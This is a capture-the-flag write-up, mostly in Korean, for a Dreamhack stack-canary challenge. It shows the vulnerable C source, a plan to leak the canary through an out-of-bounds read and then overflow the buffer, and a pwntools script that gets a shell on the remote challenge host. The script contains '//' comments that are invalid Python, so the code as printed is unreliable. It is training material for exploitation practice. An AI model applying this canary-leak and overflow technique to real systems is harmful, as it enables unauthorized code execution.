# 🚩 [ssp_001]

> **Category:** Pwnable  
> **Difficulty:** <span style="color: #CD7F32; font-weight: bold;">B2</span>
> **Flag:** `FLAG{example_flag_here}`  

---

## 📄 1. Challenge Description
* **Environment :**
  ```text
    Ubuntu 16.04
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
* **Reference :**
  ```text
    Stack Smashing Protector
---

## 🔍 2. Vulnerability Analysis

이 문제는 **Stack Smashing Protector(Canary)**가 적용되어 있어 단순 BOF로 `RET`를 덮어쓰면 카나리 검증 실패로 프로그램이 터집니다. 따라서 **1) Canary Leak** 후 **2) Buffer Overflow**를 수행해야 합니다.

### 📌 Code Review & Vulnerable Points
C 언어 의사 코드(Decompiled Code) 및 핵심 메뉴 기능 분석:

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(30);
}
// ret에 덮어야 할 주소
void get_shell() {
    system("/bin/sh");
}
// OOB(Out of Bounds)로 canary leak 가능
void print_box(unsigned char *box, int idx) {
    printf("Element of index %d is : %02x\n", idx, box[idx]);
}
void menu() {
    puts("[F]ill the box");
    puts("[P]rint the box");
    puts("[E]xit");
    printf("> ");
}
int main(int argc, char *argv[]) {
    unsigned char box[0x40] = {};
    char name[0x40] = {};
    char select[2] = {};
    int idx = 0, name_len = 0;
    initialize();
    while(1) {
        menu();
        read(0, select, 2);
        switch( select[0] ) {
            case 'F':
                printf("box input : ");
                read(0, box, sizeof(box));
                break;
            case 'P':
                printf("Element index : ");
                scanf("%d", &idx);
                print_box(box, idx);
                break;
            case 'E':
                printf("Name Size : ");
                scanf("%d", &name_len);
                printf("Name : ");
                read(0, name, name_len);  //BOF 가능
                return 0;
            default:
                break;
        }
    }
}
```
## 3. Exploit Scenario (공격 시나리오)

1. **`[P]rint the box` 메뉴 사용:**
   * `box` 배열 시작점부터 Stack Canary까지의 오프셋(거리)을 구합니다.
   * OOB를 이용해 Canary 값을 바이트 단위로 읽어옵니다.

2. **`[E]xit` 메뉴 사용:**
   * `name_len`에 충분히 큰 값(예: 128)을 입력합니다.
   * `Payload = Dummy + Canary + Dummy + get_shell()` 형태로 페이로드를 구성하여 전송합니다.

3. **Shell 획득 및 Flag 획득**

---

## 4. Exploit Script (`ex.py`)

```python
from pwn import *

#p = process("./ssp_001")
p=remote("host3.dreamhack.games",18707)
#print(f"PID : {p.pid}")
canary = b"\x00"
get_shell = 0x80486b9

for i in range(129,132,1): //box에서 canary까지 index
    p.sendafter(b"> ",b"P")
    p.sendlineafter(b"Element index : ", str(i).encode())
    p.recvuntil(b"is : ")
    a = p.recv(2)
    canary += unhex(a) // 예) "08" -> b"\x08" 

canary = u32(canary)  //  예) b"\x08" -> 0x08
p.sendafter(b"> ",b"E")
p.sendlineafter(b"Name Size : ", b"90")

payload = b"a" * 64                
payload += p32(canary) //  예) 0x08 -> b"\x08"           
payload += b"a" * 8
payload += p32(get_shell)


p.sendafter(b"Name : ", payload)

p.interactive()
```
